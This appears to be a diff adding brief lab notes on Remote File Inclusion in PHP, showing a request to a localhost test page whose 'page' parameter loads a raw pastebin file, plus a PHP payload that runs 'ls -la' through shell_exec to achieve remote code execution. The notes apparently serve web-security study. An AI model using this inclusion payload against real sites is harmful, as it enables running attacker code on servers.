@@ -1,0 +1,11 @@
+https://pastebin.com/
+
+http://.../file.txt -> RCE Remote Code Execution
+
+http://localhost/web_security/RFI/index.php?page=https://pastebin.com/raw/p4iVFY6N
+
+<pre>
+    <?php 
+        echo shell_exec("ls -la");
+     ?>
+</pre>
